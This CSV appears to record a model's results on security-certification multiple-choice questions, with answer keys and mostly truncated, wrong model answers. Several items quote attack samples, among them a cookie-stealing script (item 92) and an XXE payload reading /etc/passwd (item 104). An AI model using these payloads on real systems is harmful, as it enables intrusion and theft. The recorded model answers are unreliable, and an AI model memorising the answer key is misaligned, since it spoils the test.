index,question,ground_truth,model_answer_raw,model_answer_parsed,is_correct
86,"A penetration tester is performing the footprinting process and is reviewing publicly available information
about an organization by using the Google search engine.
Which of the following advanced operators would allow the pen tester to restrict the search to the
organization?s web domain?
A.  [allinurl:]
B.  [location:]
C.  [site:]
D.  [link:]
",C,A.  [all,A,False
87,"Becky has been hired by a client from Dubai to perform a penetration test against one of their remote offices.
Working from her location in Columbus, Ohio, Becky runs her usual reconnaissance scans to obtain basic
information about their network. When analyzing the results of her Whois search, Becky notices that the IP
was allocated to a location in Le Havre, France. Which regional Internet registry should Becky go to for
detailed information?
A.  ARIN
B.  APNIC
C.  RIPE
D.  LACNIC
",C,As you can see from,A,False
88,"A company?s Web development team has become aware of a certain type of security vulnerability in their
Web software. To mitigate the possibility of this vulnerability being exploited, the team wants to modify the
software requirements to disallow users from entering HTML as input into their Web application.
What kind of Web application vulnerability likely exists in their software?
A.  Cross-site scripting vulnerability
B.  SQL injection vulnerability
C.  Web site defacement vulnerability
D.  Gross-site Request Forgery vulnerability
",A,A. Cross-site scripting,A,True
89,"Which of the following provides a security professional with most information about the system?s security
posture?
A.  Phishing, spamming, sending trojans
B.  Social engineering, company site browsing tailgating
C.  Wardriving, warchalking, social engineering
D.  Port scanning, banner grabbing service identification
",D,A.  Phishing,A,False
90,"BitLocker encryption has been implemented for all the Windows-based computers in an organization. You are
concerned that someone might lose their cryptographic key. Therefore, a mechanism was implemented to
recover the keys from Active Directory. What is this mechanism called in cryptography?
A.  Key archival
B.  Key escrow.
C.  Certificate rollover
D.  Key renewal
",B,The answer is B.,N/A,False
91,"What would be the purpose of running ""wget 192.168.0.15 -q -S"" against a web server?
A.  Performing content enumeration on the web server to discover hidden folders
B.  Using wget to perform banner grabbing on the webserver
C.  Flooding the web server with requests to perform a DoS attack
D.  Downloading all the contents of the web page locally for further examination
",B,"As you can see,",A,False
92,"Judy created a forum, one day. she discovers that a user is posting strange images without writing comments.
She immediately calls a security expert, who discovers that the following code is hidden behind those images:
<script>
document.writef<img src=""https://Ioca(host/submitcookie.php? cookie ='+ escape(document.cookie)+ "" />);
</script>
What issue occurred for the users who clicked on the image?
A.  The code inject a new cookie to the browser.
B.  The code redirects the user to another site.
C.  The code is a virus that is attempting to gather the users username and password.
D.  This php file silently executes the code and grabs the users session cookie and session ID.
",D,A.  The code,A,False
93,"Stella, a professional hacker, performs an attack on web services by exploiting a vulnerability that provides
additional routing information in the SOAP header to support asynchronous communication. This further
allows the transmission of web-service requests and response messages using different TCP connections.
Which of the following attack techniques is used by Stella to compromise the web services?
A.  XML injection
B.  WS-Address spoofing
C.  SOAPAction spoofing
D.  Web services parsing attacks
",B,A.  XML injection,A,False
94,"If executives are found liable for not properly protecting their company?s assets and information systems, what
type of law would apply in this situation?
A.  Criminal
B.  International
C.  Common
D.  Civil
",D,"### Explanation:

In the",N/A,False
95,"An attacker changes the profile information of a particular user (victim) on the target website. The attacker
uses this string to update the victim?s profile to a text file and then submit the data to the attacker?s database.
<
iframe src=??http://www.vulnweb.com/updateif.php?? style=??display:none??
> < /iframe >
What is this type of attack (that can use either HTTP GET or HTTP POST) called?
A.  Browser Hacking
B.  Cross-Site Scripting
C.  SQL Injection
D.  Cross-Site Request Forgery
",D,A,A,False
96,"You start performing a penetration test against a specific website and have decided to start from grabbing all
the links from the main page.
What Is the best Linux pipe to achieve your milestone?
A.  dirb https://site.com | grep ""site""
B.  curl -s https://sile.com | grep ??< a href-\?http"" | grep ""Site-com- | cut -d ""V"" -f 2
C.  wget https://stte.com | grep ""< a href=\*http"" | grep ""site.com""
D.  wgethttps://site.com | cut-d""http-
",C,The correct answer is option,N/A,False
97,"Upon establishing his new startup, Tom hired a cloud service provider (CSP) but was dissatisfied with their
service and wanted to move to another CSP.
What part of the contract might prevent him from doing so?
A.  Virtualization
B.  Lock-in
C.  Lock-down
D.  Lock-up
",B,A.  Virtualization,A,False
98,"In both pharming and phishing attacks, an attacker can create websites that look similar to legitimate sites with
the intent of collecting personal identifiable information from its victims.
What is the difference between pharming and phishing attacks?
A.  In a pharming attack, a victim is redirected to a fake website by modifying their host configuration file or by exploiting vulnerabilities in DNS. In a phishing attack, an attacker provides the victim with a URL that is either misspelled or looks similar to the actual websites domain name
B.  In a phishing attack, a victim is redirected to a fake website by modifying their host configuration file or by exploiting vulnerabilities in DNS. In a pharming attack, an attacker provides the victim with a URL that is either misspelled or looks very similar to the actual websites domain name
C.  Both pharming and phishing attacks are purely technical and are not considered forms of social engineering
D.  Both pharming and phishing attacks are identical
",A,Option A: In a,N/A,False
99,"Louis, a professional hacker, had used specialized tools or search engines to encrypt all his browsing activity
and navigate anonymously to obtain sensitive/hidden information about official government or federal
databases. After gathering the Information, he successfully performed an attack on the target government
organization without being traced. Which of the following techniques is described in the above scenario?
A.  Dark web footprinting
B.  VoIP footpnnting
C.  VPN footprinting
D.  website footprinting
",A,The correct answer is option,N/A,False
100,"When considering how an attacker may exploit a web server, what is web server footprinting?
A.  When an attacker implements a vulnerability scanner to identify weaknesses
B.  When an attacker creates a complete profile of the site's external links and file structures
C.  When an attacker gathers system-level data, including account details and server names
D.  When an attacker uses a brute-force attack to crack a web-server password
",B,A.  When an,A,False
101,"Harris is attempting to identify the OS running on his target machine. He inspected the initial TTL in the IP
header and the related TCP window size and obtained the following results:
TTL: 64 Window Size: 5840
What is the OS running on the target machine?
A.  Solaris OS
B.  Windows OS
C.  Mac OS
D.  Linux OS
",D,"### Explanation:

The TTL",N/A,False
102,"Which protocol is used for setting up secure channels between two devices, typically in VPNs?
A.  PEM
B.  ppp
C.  IPSEC
D.  SET
",C,The correct option is B,N/A,False
103,"Peter, a system administrator working at a reputed IT firm, decided to work from his home and login remotely.
Later, he anticipated that the remote connection could be exposed to session hijacking. To curb this possibility,
he implemented a technique that creates a safe and encrypted tunnel over a public network to securely send
and receive sensitive information and prevent hackers from decrypting the data flow between the endpoints.
What is the technique followed by Peter to send files securely through a remote connection?
A.  DMZ
B.  SMB signing
C.  VPN
D.  Switch network
",C,Option A is not a,N/A,False
104,"Which of the following web vulnerabilities would an attacker be attempting to exploit if they delivered the
following input?
<!DOCTYPE blah [ < IENTITY trustme SYSTEM ""file:///etc/passwd"" > ] >
A.  XXE
B.  SQLi
C.  IDOR
D.  XXS
",A,A.  XXE,A,True
105,"While performing an Nmap scan against a host, Paola determines the existence of a firewall. In an attempt to
determine whether the firewall is stateful or stateless, which of the following options would be best to use?
A.  -sA
B.  -sX
C.  -sT
D.  -sF
",A,"B

B is the",B,False
106,"What type of virus is most likely to remain undetected by antivirus software?
A.  Cavity virus
B.  Stealth virus
C.  File-extension virus
D.  Macro virus
",B,A.  Cavity,A,False
107,"Which of the following types of SQL injection attacks extends the results returned by the original query,
enabling attackers to run two or more statements if they have the same structure as the original one?
A.  Error-based injection
B.  Boolean-based blind SQL injection
C.  Blind SQL injection
D.  Union SQL injection
",D,The answer to this question,N/A,False
108,"To hide the file on a Linux system, you have to start the filename with a specific character. What is the
character?
A.  Exclamation mark (!)
B.  Underscore (_)
C.  Tilde H
D.  Period (.)
",D,The correct answer is C,N/A,False
109,"Bob, your senior colleague, has sent you a mail regarding a deal with one of the clients. You are requested to
accept the offer and you oblige. After 2 days, Bab denies that he had ever sent a mail. What do you want to
??know?? to prove yourself that it was Bob who had send a mail?
A.  Non-Repudiation
B.  Integrity
C.  Authentication
D.  Confidentiality
",A,Let us analyze the question,N/A,False
110,"You want to analyze packets on your wireless network. Which program would you use?
A.  Wireshark with Airpcap
B.  Airsnort with Airpcap
C.  Wireshark with Winpcap
D.  Ethereal with Winpcap
",A,B,B,False
111,"Henry is a penetration tester who works for XYZ organization. While performing enumeration on a client
organization, he queries the DNS server for a specific cached DNS record. Further, by using this cached
record, he determines the sites recently visited by the organization's user. What is the enumeration technique
used by Henry on the organization?
A.  DNS zone walking
B.  DNS cache snooping
C.  DNS SEC zone walking
D.  DNS cache poisoning
",B,A.  DNS zone,A,False
112,"Insecure direct object reference is a type of vulnerability where the application does not verify if the user is
authorized to access the internal object via its name or key. Suppose a malicious user Rob tries to get access to
the account of a benign user Ned.
Which of the following requests best illustrates an attempt to exploit an insecure direct object reference
vulnerability?
A.  ?GET /restricted/goldtransfer?to=Rob&from=1 or 1=1? HTTP/1.1Host: westbank.com?
B.  ?GET /restricted/\r\n\%00account%00Ned%00access HTTP/1.1 Host: westbank.com?
C.  ?GET /restricted/accounts/?name=Ned HTTP/1.1 Host westbank.com?
D.  ?GET /restricted/ HTTP/1.1 Host: westbank.com
",C,The correct option is C,N/A,False
113,"An organization has automated the operation of critical infrastructure from a remote location. For this purpose,
all the industrial control systems are connected to the Internet. To empower the manufacturing process, ensure
the reliability of industrial networks, and reduce downtime and service disruption, the organization deckled to
install an OT security tool that further protects against security incidents such as cyber espionage, zero-day
attacks, and malware. Which of the following tools must the organization employ to protect its critical
infrastructure?
A.  Robotium
B.  BalenaCloud
C.  Flowmon
D.  IntentFuzzer
",C,C. Flowmon,C,True
114,"Sophia is a shopping enthusiast who spends significant time searching for trendy outfits online. Clark, an
attacker, noticed her activities several times and sent a fake email containing a deceptive page link to her
social media page displaying all-new and trendy outfits. In excitement, Sophia clicked on the malicious link
and logged in to that page using her valid credentials. Which of the following tools is employed by Clark to
create the spoofed email?
A.  PyLoris
B.  Slowloris
C.  Evilginx
D.  PLCinject
",C,PyLoris is a,N/A,False
115,"You are using a public Wi-Fi network inside a coffee shop. Before surfing the web, you use your VPN to
prevent intruders from sniffing your traffic. If you did not have a VPN, how would you identify whether
someone is performing an ARP spoofing attack on your laptop?
A.  You should check your ARP table and see if there is one IP address with two different MAC addresses.
B.  You should scan the network using Nmap to check the MAC addresses of all the hosts and look for duplicates.
C.  You should use netstat to check for any suspicious connections with another IP address within the LAN.
D.  You cannot identify such an attack and must use a VPN to protect your traffic, r
",A,A.  You should,A,True
116,"To create a botnet. the attacker can use several techniques to scan vulnerable machines. The attacker first
collects Information about a large number of vulnerable machines to create a list. Subsequently, they infect the
machines. The list Is divided by assigning half of the list to the newly compromised machines. The scanning
process runs simultaneously. This technique ensures the spreading and installation of malicious code in little
time.
Which technique is discussed here?
A.  Hit-list-scanning technique
B.  Topological scanning technique
C.  Subnet scanning technique
D.  Permutation scanning technique
",A,The correct answer is A,N/A,False
117,"Mason, a professional hacker, targets an organization and spreads Emotet malware through malicious script.
After infecting the victim's device. Mason further used Emotet to spread the infection across local networks
and beyond to compromise as many machines as possible. In this process, he used a tool, which is a
self-extracting RAR file, to retrieve information related to network resources such as writable share drives.
What is the tool employed by Mason in the above scenario?
A.  NetPass.exe
B.  Outlook scraper
C.  WebBrowserPassView
D.  Credential enumerator
",D,"Mason, a professional",N/A,False
118,"Elante company has recently hired James as a penetration tester. He was tasked with performing enumeration
on an organization's network. In the process of enumeration, James discovered a service that is accessible to
external sources. This service runs directly on port 21. What is the service enumerated byjames in the above
scenario?
A.  Border Gateway Protocol (BGP)
B.  File Transfer Protocol (FTP)
C.  Network File System (NFS)
D.  Remote procedure call (RPC)
",B,This is a very common,N/A,False
119,"An unauthorized individual enters a building following an employee through the employee entrance after the
lunch rush. What type of breach has the individual just performed?
A.  Reverse Social Engineering
B.  Tailgating
C.  Piggybacking
D.  Announced
",B,D. Announced,D,False
120,"By performing a penetration test, you gained access under a user account. During the test, you established a
connection with your own machine via the SMB service and occasionally entered your login and password in
plaintext.
Which file do you have to clean to clear the password?
A.  .X session-log
B.  .bashrc
C.  .profile
D.  .bash_history
",D,D. .bash,D,True
121,"Websites and web portals that provide web services commonly use the Simple Object Access Protocol
(SOAP).
Which of the following is an incorrect definition or characteristics of the protocol?
A.  Exchanges data between web services
B.  Only compatible with the application protocol HTTP
C.  Provides a structured model for messaging
D.  Based on XML
",B,"C

C.",C,False
122,"Attacker Simon targeted the communication network of an organization and disabled the security controls of
NetNTLMvl by modifying the values of LMCompatibilityLevel, NTLMMinClientSec, and
RestrictSendingNTLMTraffic. He then extracted all the non-network logon tokens from all the active
processes to masquerade as a legitimate user to launch further attacks. What is the type of attack performed by
Simon?
A.  Internal monologue attack
B.  Combinator attack
C.  Rainbow table attack
D.  Dictionary attack
",A,"A
Internal monologue",A,True
123,"Which of the following Bluetooth hacking techniques does an attacker use to send messages to users without
the recipient?s consent, similar to email spamming?
A.  Bluesmacking
B.  BlueSniffing
C.  Bluejacking
D.  Bluesnarfing
",C,A.  Bluesm,A,False
124,"A Security Engineer at a medium-sized accounting firm has been tasked with discovering how much
information can be obtained from the firm?s public facing web servers. The engineer decides to start by using
netcat to port 80.
The engineer receives this output:
HTTP/1.1 200 OK
Server: Microsoft-IIS/6
Expires: Tue, 17 Jan 2011 01:41:33 GMT
Date: Mon, 16 Jan 2011 01:41:33 GMT
Content-Type: text/html
Accept-Ranges: bytes
Last Modified: Wed, 28 Dec 2010 15:32:21 GMT
ETag:?b0aac0542e25c31:89d?
Content-Length: 7369
Which of the following is an example of what the engineer performed?
A.  Banner grabbing
B.  SQL injection
C.  Whois database query
D.  Cross-site scripting
",A,A. Banner grabbing,A,True
125,"Which of the following Metasploit post-exploitation modules can be used to escalate privileges on Windows
systems?
A.  getsystem
B.  getuid
C.  keylogrecorder
D.  autoroute
",A,B.  getsystem,B,False
126,"What type of a vulnerability/attack is it when the malicious person forces the user?s browser to send an
authenticated request to a server?
A.  Session hijacking
B.  Server side request forgery
C.  Cross-site request forgery
D.  Cross-site scripting
",C,A. Session hijacking,A,False
127,"Which of the following options represents a conceptual characteristic of an anomaly-based IDS over a
signature-based IDS?
A.  Produces less false positives
B.  Can identify unknown attacks
C.  Requires vendor updates for a new threat
D.  Cannot deal with encrypted network traffic
",B,Option A is correct.,N/A,False
128,"Bill has been hired as a penetration tester and cyber security auditor for a major credit card company. Which
information security standard is most applicable to his role?
A.  FISMA
B.  HITECH
C.  PCI-DSS
D.  Sarbanes-OxleyAct
",C,The answer to the question,N/A,False
129,"When conducting a penetration test, it is crucial to use all means to get all available information about the
target network. One of the ways to do that is by sniffing the network. Which of the following cannot be
performed by the passive network sniffing?
A.  Identifying operating systems, services, protocols and devices
B.  Modifying and replaying captured network traffic
C.  Collecting unencrypted information about usernames and passwords
D.  Capturing a network traffic for further analysis
",B,A.  Identifying,A,False
130,"Dayn, an attacker, wanted to detect if any honeypots are installed in a target network. For this purpose, he used
a time-based TCP fingerprinting method to validate the response to a normal computer and the response of a
honeypot to a manual SYN request. Which of the following techniques is employed by Dayn to detect
honeypots?
A.  Detecting honeypots running on VMware
B.  Detecting the presence of Honeyd honeypots
C.  Detecting the presence of Snort_inline honeypots
D.  Detecting the presence of Sebek-based honeypots
",C,A.  Detecting,A,False
131,"Kate dropped her phone and subsequently encountered an issue with the phone's internal speaker. Thus, she is
using the phone's loudspeaker for phone calls and other activities. Bob, an attacker, takes advantage of this
vulnerability and secretly exploits the hardware of Kate's phone so that he can monitor the loudspeaker's
output from data sources such as voice assistants, multimedia messages, and audio files by using a malicious
app to breach speech privacy. What is the type of attack Bob performed on Kate in the above scenario?
A.  Man-in-the-disk attack
B.  aLTEr attack
C.  SIM card attack
D.  Spearphone attack
",D,D.  The,D,True
132,"Cross-site request forgery involves:
A.  A request sent by a malicious user from a browser to a server
B.  Modification of a request by a proxy between client and server
C.  A browser making a request to a server without the user?s knowledge
D.  A server making a request to another server without the user?s knowledge
",C,A.  A request,A,False
133,"Which type of attack attempts to overflow the content-addressable memory (CAM) table in an Ethernet
switch?
A.  Evil twin attack
B.  DNS cache flooding
C.  MAC flooding
D.  DDoS attack
",C,C,C,True
134,"How can rainbow tables be defeated?
A.  Use of non-dictionary words
B.  All uppercase character passwords
C.  Password salting
D.  Lockout accounts under brute force password cracking attempts
",C,A.  Use of,A,False
135,"Miley, a professional hacker, decided to attack a target organization's network. To perform the attack, she used
a tool to send fake ARP messages over the target network to link her MAC address with the target system's IP
address. By performing this, Miley received messages directed to the victim's MAC address and further used
the tool to intercept, steal, modify, and block sensitive communication to the target system. What is the tool
employed by Miley to perform the above attack?
A.  Gobbler
B.  KDerpNSpoof
C.  BetterCAP
D.  Wireshark
",C,The correct answer is A,N/A,False
136,"The network in ABC company is using the network address 192.168.1.64 with mask 255.255.255.192. In the
network the servers are in the addresses 192.168.1.122, 192.168.1.123 and 192.168.1.124. An attacker is
trying to find those servers but he cannot see them in his scanning. The command he is using is: nmap
192.168.1.64/28.
Why he cannot see the servers?
A.  He needs to add the command ??ip address?? just before the IP address
B.  He needs to change the address to 192.168.1.0 with the same mask
C.  He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28 and the servers are not in that range
D.  The network must be dawn and the nmap command and IP address are ok
",C,A.  He needs,A,False
137,"Ben purchased a new smartphone and received some updates on it through the OTA method. He received two
messages: one with a PIN from the network operator and another asking him to enter the PIN received from
the operator. As soon as he entered the PIN, the smartphone started functioning in an abnormal manner. What
is the type of attack performed on Ben in the above scenario?
A.  Advanced SMS phishing
B.  Bypass SSL pinning
C.  Phishing
D.  Tap 'n ghost attack
",A,The correct answer is B,N/A,False
138,"Attempting an injection attack on a web server based on responses to True/False QUESTION NO:s is called
which of the following?
A.  Compound SQLi
B.  Blind SQLi
C.  Classic SQLi
D.  DMS-specific SQLi
",B,A,A,False
139,"You have compromised a server and successfully gained a root access. You want to pivot and pass traffic
undetected over the network and evade any possible Intrusion Detection System. What is the best approach?
A.  Use Alternate Data Streams to hide the outgoing packets from this server.
B.  Use HTTP so that all traffic can be routed vis a browser, thus evading the internal Intrusion Detection Systems.
C.  Install Cryptcat and encrypt outgoing packets from this server.
D.  Install and use Telnet to encrypt all outgoing traffic from this server.
",C,A.  Use Alternate,A,False
140,"John, a professional hacker, decided to use DNS to perform data exfiltration on a target network, in this
process, he embedded malicious data into the DNS protocol packets that even DNSSEC cannot detect. Using
this technique. John successfully injected malware to bypass a firewall and maintained communication with
the victim machine and C&C server. What is the technique employed by John to bypass the firewall?
A.  DNS cache snooping
B.  DNSSEC zone walking
C.  DNS tunneling method
D.  DNS enumeration
",C,"### Solution:

The correct",N/A,False
141,"Which iOS jailbreaking technique patches the kernel during the device boot so that it becomes jailbroken after
each successive reboot?
A.  Tethered jailbreaking
B.  Semi-tethered jailbreaking
C.  Untethered jailbreaking
D.  Semi-Untethered jailbreaking
",C,A.  Tether,A,False
142,"You want to do an ICMP scan on a remote computer using hping2. What is the proper syntax?
A.  hping2 host.domain.com
B.  hping2 --set-ICMP host.domain.com
C.  hping2 -i host.domain.com
D.  hping2 -1 host.domain.com
",D,A.  hping,A,False
143,"You have been authorized to perform a penetration test against a website. You want to use Google dorks to
footprint the site but only want results that show file extensions. What Google dork operator would you use?
A.  filetype
B.  ext
C.  inurl
D.  site
",A,The answer is A.,N/A,False
144,"Firewalls are the software or hardware systems that are able to control and monitor the traffic coming in and
out the target network based on pre-defined set of rules. Which of the following types of firewalls can protect
against SQL injection attacks?
A.  Data-driven firewall
B.  Packet firewall
C.  Web application firewall
D.  Stateful firewall
",C,A.  Data-driven,A,False
145,"Jane is working as a security professional at CyberSol Inc. She was tasked with ensuring the authentication
and integrity of messages being transmitted in the corporate network. To encrypt the messages, she
implemented a security model in which every user in the network maintains a ring of public keys. In this
model, a user needs to encrypt a message using the receiver's public key, and only the receiver can decrypt the
message using their private key. What is the security model implemented by Jane to secure corporate
messages?
A.  Zero trust network
B.  Transport Layer Security (TLS)
C.  Secure Socket Layer (SSL)
D.  Web of trust (WOT)
",D,The answer is C.,N/A,False
146,"A DDOS attack is performed at layer 7 to take down web infrastructure. Partial HTTP requests are sent to the
web infrastructure or applications. Upon receiving a partial request, the target servers opens multiple
connections and keeps waiting for the requests to complete.
Which attack is being described here?
A.  Desynchronization
B.  Slowloris attack
C.  Session splicing
D.  Phlashing
",B,A. Desynchronization,A,False
147,"A post-breach forensic investigation revealed that a known vulnerability in Apache Struts was to blame for the
Equifax data breach that affected 143 million customers. A fix was available from the software vendor for
several months prior 10 the Intrusion. This Is likely a failure in which of the following security processes?
A.  vendor risk management
B.  Security awareness training
C.  Secure deployment lifecycle
D.  Patch management
",D,A.  vendor risk,A,False
148,"Mirai malware targets loT devices. After infiltration, it uses them to propagate and create botnets that then
used to launch which types of attack?
A.  MITM attack
B.  Birthday attack
C.  DDoS attack
D.  Password attack
",C,"A
The correct answer",A,False
149,"Thomas, a cloud security professional, is performing security assessment on cloud services to identify any
loopholes. He detects a vulnerability in a bare-metal cloud server that can enable hackers to implant malicious
backdoors in its firmware. He also identified that an installed backdoor can persist even if the server is
reallocated to new clients or businesses that use it as an laaS.
What is the type of cloud attack that can be performed by exploiting the vulnerability discussed in the above
scenario?
A.  Man-in-the-cloud (MITC) attack
B.  Cloud cryptojacking
C.  Cloudborne attack
D.  Metadata spoofing attack
",C,C. Cloudb,C,True
150,"Tony wants to integrate a 128-bit symmetric block cipher with key sizes of 128,192, or 256 bits into a software
program, which involves 32 rounds of computational operations that include substitution and permutation
operations on four 32-bit word blocks using 8-variable S-boxes with 4-bit entry and 4-bit exit. Which of the
following algorithms includes all the above features and can be integrated by Tony into the software program?
A.  TEA
B.  CAST-128
C.  RC5
D.  serpent
",D,We can use the following,N/A,False
